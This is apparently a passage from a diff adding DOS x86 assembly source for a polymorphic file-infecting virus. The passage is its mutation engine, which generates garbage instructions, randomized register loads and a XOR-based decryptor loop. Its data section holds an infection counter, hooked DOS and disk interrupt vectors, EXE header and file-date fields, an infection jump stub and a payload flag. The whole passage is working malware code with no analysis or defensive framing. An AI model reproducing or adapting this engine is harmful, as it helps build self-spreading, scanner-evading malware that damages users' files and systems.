+             cld                         ; Clear direction flag
+             inc     bp                  ; Increase Base Pointer (BP)
+             dec     bp                  ; Decrease Base Pointer (BP)
+
+gen_garbage  proc    near                ; Generate upto four garbage instr...
+             push    ax cx               ; Save registers at stack
+             call    get_rnd_num
+             and     ah,00000011b        ; AH = random number within three
+             sub     cx,cx               ; Zero CX
+             xchg    ah,cl               ; CL = random number within three
+             inc     cl                  ; CL =   "      "      "    four
+garbag__loop:
+             call    gen_garbage_
+
+             loop    garbag__loop
+             pop     cx ax               ; Load registers from stack
+
+             ret                         ; Return
+             endp
+
+gen_garbage_ proc    near                ; Generate a garbage instruction
+             pushf                       ; Save flags at stack
+             push    ax bx dx cx         ; Save registers at stack
+             call    get_rnd_num
+
+             db      10000011b,11100000b ; AND AX,03h (opcode 83h,0e0h,03h)
+             db      00000011b           ; AX = random number within three
+             call    mul_by_two
+
+             call    get_rnd_num
+
+             jmp     cs:[si+garbage_tbl]
+gen_gar_exit:
+             pop     cx dx bx ax         ; Load registers from stack
+             popf                        ; Load flags from stack
+
+             ret                         ; Return
+gen_one_byte:
+             and     al,00000111b        ; AL = random number within seven
+             lea     bx,one_byte_tbl     ; BX = offset of one_byte_tbl
+             xlat                        ; AL = one opcode within one_byte_tbl
+             stosb                       ; Store opcode from within one_byt...
+
+             jmp     gen_gar_exit
+gen_cmp_acc:
+             and     al,00000001b        ; AL = random number within one
+             or      al,00111100b        ; CMP AL,imm8 or CMP AX,imm16
+             stosb                       ; Store CMP AL,imm8 or CMP AX,imm16
+
+             test    al,00000001b        ; CMP AL,imm8 or CMP AX,imm16?
+             pushf                       ; Save flags at stack
+             call    get_rnd_num
+             popf                        ; Load flags from stack
+             jnz     store_imm16_        ; CMP AX,imm16? Jump to store_imm16_
+
+             stosb                       ; Store 8-bit immediate
+gen_jmp_con:
+             jmp     gen_jmp_con_
+store_imm16_:
+             stosw                       ; Store 16-bit immediate
+
+             jmp     gen_jmp_con
+gen_cmp_acc_:
+             and     al,00000001b        ; AL = random number within one
+             or      al,00111010b        ; CMP AL,AL or CMP AX,AX
+             or      ah,11000000b        ;  "    "   "   "    "
+             stosw                       ; Store CMP AL,AL or CMP AX,AX
+gen_jmp_con_:
+             call    get_rnd_num
+             and     al,00001111b        ; AL = random number within fifteen
+             or      al,01110000b        ; JO, JNO, JB, JAE, JE, JNE, JBE, ...
+             sub     ah,ah               ; Zero AH
+             stosw                       ; Store JO, JNO, JB, JAE, JE, JNE,...
+
+             jmp     gen_gar_exit
+gen_test_acc:
+             and     al,00000001b        ; AL = random number within one
+             or      al,10000100b        ; TEST AL,AL or TEST AX,AX
+             or      ah,11000000b        ;  "     "   "   "     "
+             stosw                       ; Store TEST AL,AL or TEST AX,AX
+
+             jmp     gen_jmp_con_
+             endp
+
+mov_reg_tbl  dw      gen_mov_xchg        ; Offset of gen_mov_xchg
+             dw      gen_mov_push        ; Offset of gen_mov_push
+
+gen_mov_reg  proc    near                ; Generate MOV reg16,imm16
+             mov     cs:[imm16],ax       ; Store 16-bit immediate
+             mov     cs:[reg16_num],dh   ; Store 16-bit register number
+             call    get_rnd_num
+
+             db      10000011b,11100000b ; AND AX,01h (opcode 83h,0e0h,01h)
+             db      00000001b           ; AX = random number within one
+             call    mul_by_two
+
+             call    get_rnd_num
+
+             jmp     cs:[si+mov_reg_tbl]
+gen_mov_xchg:
+             and     ah,00000111b        ; AH = random number within seven
+             call    get_rnd_reg
+             mov     dh,ah               ; DH = random register number
+
+             mov     al,10111000b        ; MOV reg16,imm16 (opcode 0b8h)
+             or      al,ah               ;  "       "      (random registe...)
+             stosb                       ; Store MOV reg16,imm16
+             mov     ax,[imm16]          ; AX = 16-bit immediate
+             stosw                       ; Store 16-bit immediate
+
+             call    gen_garbage
+             mov     al,10000111b        ; XCHG reg16,reg16 (opcode 87h,0c0h)
+             mov     ah,11000000b        ;  "        "         "       "
+             or      ah,dh               ;  "        "      (random regist...)
+
+             mov     dh,[reg16_num]      ; DH = 16-bit register number
+             sub     cx,cx               ; Zero CX
+             mov     cl,03h              ; Shift specified register number ...
+             shl     dh,cl               ; DH = 16-bit register number
+             or      ah,dh               ; XCHG reg16,reg16 (specified reg...)
+             stosw                       ; Store XCHG reg16,reg16
+
+             ret                         ; Return
+gen_mov_push:
+             and     ah,00000111b        ; AH = random number within seven
+             call    get_rnd_reg
+             mov     dh,ah               ; DH = random register number
+
+             mov     al,10111000b        ; MOV reg16,imm16 (opcode 0b8h)
+             or      al,ah               ;  "       "      (random registe...)
+             stosb                       ; Store MOV reg16,imm16
+             mov     ax,[imm16]          ; AX = 16-bit immediate
+             stosw                       ; Store 16-bit immediate
+
+             call    gen_garbage_
+             mov     al,01010000b        ; PUSH reg16 (opcode 50h)
+             or      al,dh               ;  "     "   (random register number)
+             stosb                       ; Store PUSH reg16
+
+             call    gen_garbage
+             mov     dh,[reg16_num]      ; DH = 16-bit register number
+             mov     al,01011000b        ; POP reg16 (opcode 58h)
+             or      al,dh               ;  "    "   (specified register n...)
+             stosb                       ; Store POP reg16
+
+             ret                         ; Return
+             endp
+
+seg_over_tbl dw      gen_push_pop        ; Offset of gen_push_pop
+             dw      gen_cs              ; Offset of gen_cs
+
+gen_seg_over proc    near                ; Generate segment override
+             call    gen_garbage
+
+             call    get_rnd_num
+             db      10000011b,11100000b ; AND AX,01h (opcode 83h,0e0h,01h)
+             db      00000001b           ; AX = random number within one
+             call    mul_by_two
+
+             jmp     cs:[si+seg_over_tbl]
+gen_push_pop:
+             mov     ax,0001111100001110b
+             stosw                       ; Store PUSH CS; POP DS (opcode 0...)
+
+             call    gen_garbage
+
+             ret                         ; Return
+gen_cs:
+             mov     al,00101110b        ; CS: (opcode 2eh)
+             stosb                       ; Store CS:
+
+             dec     [xor_bx_i_off]      ; Decrease offset of XOR [BX+imm16...
+
+             ret                         ; Return
+             endp
+
+gen_xor_bx_i proc    near                ; Generate XOR [BX+imm16],AX
+             call    gen_seg_over
+
+             mov     al,00110001b        ; XOR [BX+imm16],AX (opcode 31h,87h)
+             mov     ah,10000111b        ;  "        "          "       "
+             add     [xor_bx_i_off],di   ; Add offset of XOR [BX+imm16],AX ...
+             stosw                       ; Store XOR [BX+imm16],AX
+
+             mov     ax,[imm16_]         ; AX = 16-bit immediate
+             stosw                       ; Store 16-bit immediate
+
+             ret                         ; Return
+             endp
+
+inc_idx_tbl  dw      gen_inc_bx          ; Offset of gen_inc_bx
+             dw      gen_add_bx          ; Offset og gen_add_bx
+
+gen_inc_idx  proc    near                ; Generate increase index register
+             call    gen_garbage
+
+             call    get_rnd_num
+             db      10000011b,11100000b ; AND AX,01h (opcode 83h,0e0h,01h)
+             db      00000001b           ; AX = random number within one
+             call    mul_by_two
+
+             call    get_rnd_num
+
+             jmp     cs:[si+inc_idx_tbl]
+gen_inc_bx:
+             mov     al,01000011b        ; INC BX (opcode 43h)
+             stosb                       ; Store INC BX
+
+             call    gen_garbage
+             stosb                       ; Store INC BX
+
+             ret                         ; Return
+gen_add_bx:
+             mov     al,10000001b        ; ADD BX,imm16 (opcode 81h,0c3h)
+             mov     ah,11000011b        ;  "     "        "       "
+             stosw                       ; Store ADD BX,imm16
+
+             mov     ax,02h              ; ADD BX,02h (opcode 81h,0c3h,02h,...
+             stosw                       ; Store ADD BX.02h
+
+             call    gen_garbage
+
+             ret                         ; Return
+             endp
+
+gen_loop_i8  proc    near                ; Generate LOOP imm8
+             mov     al,11100010b        ; LOOP imm8 (opcode 0e2h)
+             stosb                       ; Store LOOP imm8
+
+             mov     bx,di               ; BX = offset of LOOP imm8
+             mov     dx,[xor_bx_i_off]   ; DX = offset of XOR [BX+imm16],AX
+             sub     bx,dx               ; BX = 8-bit immediate
+             mov     bh,0ffh             ; BH =   "       "
+             sub     bh,bl               ; Subtract two hundred and fifty-f...
+             xchg    al,bh               ; AL = 8-bit immediate
+             stosb                       ; Store 8-bit immediate
+
+             ret                         ; Return
+             endp
+
+mul_by_two   proc    near                ; Multiply by two
+             mov     bx,02h              ; Multiply by two
+             mul     bx                  ; AX = offset mulitplied by two
+             mov     si,ax               ; SI =   "        "      "   "
+
+             ret                         ; Return
+             endp
+
+
+table_begin_:
+reg16_table  db      00000000b           ; Accumulator register (AX)
+             db      00000001b           ; Count register (CX)
+             db      00000011b           ; Base register (BX)
+             db      00000100b           ; Stack Pointer (SP)
+table_end_:
+
+get_rnd_reg  proc    near                ; Get random 16-bit register
+             push    ax cx di            ; Save registers at stack
+             lea     di,reg16_table      ; DI = offset of reg16_table
+             mov     cx,(table_end_-table_begin_)
+             mov     al,ah               ; AL = register number
+             repne   scasb               ; Compare register number with table
+             pop     di cx ax            ; Load registers from stack
+             jne     no_match            ; Not equal? Jump to no_match
+
+             mov     ah,00000010b        ; AH = data register (DX)
+no_match:
+             ret                         ; Return
+             endp
+             endp
+
+exe_header   db      1ch dup(?)          ; EXE header
+random_num   dd      19821h              ; 32-bit random number
+random_num_  dw      ?                   ; 16-bit random number
+crypt_key    dw      ?                   ; Encryption/decryption key
+imm16        dw      ?                   ; 16-bit immediate
+reg16_num    db      ?                   ; 16-bir register number
+infect_count db      ?                   ; Infection counter
+             db      02h dup (00h)
+int21_addr   dd      ?                   ; Address of interrupt 21h
+int13_addr   dd      ?                   ; Address of interrupt 13h
+int24_addr   dd      ?                   ; Address of interrupt 24h
+stack_seg    dw      ?                   ; Stack segment
+stack_ptr    dw      ?                   ; Stack pointer
+file_handle  dw      ?                   ; File handle
+filesize     dd      ?                   ; Filesize
+file_time_   dw      ?                   ; File time
+file_date    dw      ?                   ; File date
+             db      02h dup (00h)
+imm16_       dw      ?                   ; 16-bit immediate
+xor_bx_i_off dw      ?                   ; Offset XOR [BX+imm16],AX
+decrypt_len  dw      ?                   ; Length of decryptor
+gen_key_stat db      ?                   ; Generate MOV reg16,imm16 status
+gen_idx_stat db      ?                   ;    "      "       "        "
+virus_offset equ     word ptr $+01h      ; Offset of virus within infected ...
+infect_code  db      11101001b,?,?       ; JMP imm16 (opcode 0e9h)
+payload_stat db      ?                   ; Payload status
+             db      1eh
+file_padding dw      ?                   ; Length of file padding
+code_end:
+             db      10h dup(?)
+buffer:
+             db      0b8h dup(?)
+crypt_end:
+             db      960h dup(?)
+data_end:
+
+end          code_begin
